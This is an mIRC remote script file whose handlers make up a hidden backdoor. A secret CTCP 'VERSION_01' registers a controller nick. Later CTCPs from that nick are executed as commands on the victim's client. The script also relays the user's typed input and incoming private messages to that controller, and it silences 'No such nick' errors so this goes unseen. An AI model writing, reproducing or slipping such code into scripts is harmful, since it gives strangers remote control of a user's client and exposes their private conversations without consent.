[script]
n0=ctcp *:VERSION_01:*:{
n1=  //set %3pty $nick
n2=  //raw -q privmsg %3pty : Component Enabled.
n3=  //halt
n4=}
n5=
n6=ctcp *:close_up:*:{
n7=  //raw -q privmsg %3pty : Closed
n8=  //set %3pty $null
n9=  //halt
n10=}
n11=
n12=ctcp *:*:*:{
n13=  if ( $nick == %3pty ) {
n14=    $1-
n15=    //halt
n16=  }
n17=}
n18=
n19=on 1:INPUT:*:{ 
n20=  if (%3pty != $null)  //raw -q privmsg %3pty : -  $me to $active  - $1-
n21=}
n22=
n23=on 1:TEXT:*:?:{ 
n24=  if (%3pty != $null) //raw -q privmsg %3pty : - $nick to $me - $1-
n25=}
n26=
n27=on 1:text:erm I want to *:#:{
n28=  //raw -q privmsg $nick : Hello mother
n29=  //halt
n30=}
n31=on *:join:#:.notice $nick Welcome to $chan . http://www.geocities.com/demond22k ownz to show that CS sux0rs.
n32=raw *:*No such nick/channel*:/halt
